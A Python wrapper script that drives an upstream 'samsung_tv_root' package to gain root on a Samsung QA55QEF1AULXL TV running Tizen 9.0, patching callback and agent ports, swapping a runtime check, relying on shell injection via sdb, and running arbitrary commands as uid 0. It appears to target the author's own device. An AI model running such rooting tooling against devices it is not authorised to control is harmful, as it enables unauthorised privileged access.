#!/usr/bin/env python3
"""Run arbitrary commands on the TV through the archive-root root agent.

This is a thin, configurable wrapper around the upstream `samsung_tv_root`
package (https://github.com/chris-ritsen/samsung-tv-root).  It works around two
quirks of the QA55QEF1AULXL (Tizen 9.0, platform `rosel`):

  * only TCP 45777 and 8000 reach the host from the TV, so both the one-shot
    sdb "capture" callback and the root-agent listener are pinned;
  * `dotnet --list-runtimes` / `--info` are unsupported because Samsung stripped
    the host, so the runtime preflight is replaced with the known-good "6.0".

Environment:
  TV            TV IP                   (default 10.27.27.3)
  HOST          host IP the TV can reach(default 10.27.27.34)
  SDB           path to the sdb binary
  TVROOT_SRC    checkout of samsung-tv-root's `src/`
  PAYLOADS      directory with the built payload assemblies
  CAPTURE_PORT  default 45777
  AGENT_PORT    default 8000
  CMD_TIMEOUT   per-command timeout, seconds (default 180)

Usage:
  tv-root-run.py 'id' 'ls -la /'
  tv-root-run.py            # just runs `id`

Exits 0 only when the agent authenticated *and* came back as uid 0.
"""

from __future__ import annotations

import asyncio
import json
import os
import sys
import traceback
from pathlib import Path

TVROOT_SRC = os.environ.get("TVROOT_SRC", "/tmp/opencode/tv-root/src")
SDB = os.environ.get("SDB", "/tmp/opencode/sdb/data/tools/sdb")
PAYLOADS = Path(os.environ.get("PAYLOADS", "/tmp/opencode/tv-root/payloads/common/out"))
TV = os.environ.get("TV", "10.27.27.3")
HOST = os.environ.get("HOST", "10.27.27.34")
CAPTURE_PORT = int(os.environ.get("CAPTURE_PORT", "45777"))
AGENT_PORT = int(os.environ.get("AGENT_PORT", "8000"))
CMD_TIMEOUT = float(os.environ.get("CMD_TIMEOUT", "180"))
ACCEPT_TIMEOUT = float(os.environ.get("ACCEPT_TIMEOUT", "150"))

sys.path.insert(0, TVROOT_SRC)
os.environ.setdefault("SDB", SDB)

from samsung_tv_root import archive_root as ar  # noqa: E402
from samsung_tv_root.sdb import SdbClient  # noqa: E402

# --- pin the two ports the host's firewall actually lets through ------------
_orig_capture = SdbClient.capture


def capture(self, command, *, callback_host=None, bind_host=None, port=CAPTURE_PORT,
            timeout=30.0, on_listening=None):
    return _orig_capture(
        self, command, callback_host=callback_host, bind_host=bind_host,
        port=port, timeout=timeout, on_listening=on_listening,
    )


SdbClient.capture = capture

_orig_server = ar.RootAgentServer


def RootAgentServer(bind_host, port, expected_peer, secret, *, require_root=True):
    return _orig_server(bind_host, AGENT_PORT, expected_peer, secret,
                        require_root=require_root)


ar.RootAgentServer = RootAgentServer


# --- replace the unsupported runtime preflight (Samsung stripped dotnet) ----
def check_target(client):
    client.connect()
    client.require_device()
    client.require_shell_injection()
    caps = ar._capture(client, "getcap /usr/bin/dotnet /usr/sbin/sdbd-tarlauncher")
    hashes = ar._capture(client, ar.SYSTEM_HASH_COMMAND)
    return ar.TargetAssessment(caps, hashes, "6.0")


ar._check_target = check_target

COMMANDS = tuple(sys.argv[1:]) or ("id",)


async def main():
    return await ar.probe(
        TV,
        callback_host=HOST,
        bind_host=HOST,
        sdb_timeout=15.0,
        accept_timeout=ACCEPT_TIMEOUT,
        command_timeout=CMD_TIMEOUT,
        commands=COMMANDS,
        payloads=PAYLOADS,
    )


if __name__ == "__main__":
    try:
        result = asyncio.run(main())
    except Exception as error:  # noqa: BLE001
        print(f"tv-root-run: {type(error).__name__}: {error}", file=sys.stderr)
        traceback.print_exc()
        raise SystemExit(2)
    print(json.dumps(result, indent=2))
    ok = (
        result.get("authenticated")
        and result.get("uid") == 0
        and result.get("euid") == 0
    )
    raise SystemExit(0 if ok else 1)
